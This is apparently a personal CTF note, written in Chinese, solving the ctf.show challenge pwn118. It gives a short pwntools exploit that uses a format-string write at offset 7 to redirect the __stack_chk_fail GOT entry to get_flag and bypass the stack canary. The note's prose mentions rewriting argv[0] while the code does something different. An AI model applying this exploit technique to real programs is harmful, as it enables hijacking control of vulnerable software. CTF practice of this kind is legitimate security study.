![[Pasted image 20260414204310.png]]
![[Pasted image 20260414204712.png]]
只有一次read机会，因此[[Bypass_pwn115]][[Bypass_pwn116]]的方法是行不通的。这里要运用[[Bypass_pwn117]]的方法，将argv[0]改写为get_flag的地址。
![[Pasted image 20260414204655.png]]
偏移为7
填充buf:0x5C-0xC
exp:
```
from pwn import *
context(arch='i386',os='linux',log_level='debug')
#p = process('./pwn117')
p = remote('pwn.challenge.ctf.show',28284)
elf = ELF('./pwn118')
stackcheck=elf.got['__stack_chk_fail']
get_flag=elf.sym['get_flag']
payload=fmtstr_payload(7,{stackcheck:get_flag})
payload=payload.ljust(0x50,b'a')
p.sendline(payload)
p.recv()
p.interactive()
```
[[fmtstr_payload]]
![[Pasted image 20260414205457.png]]
![[Pasted image 20260414205548.png]]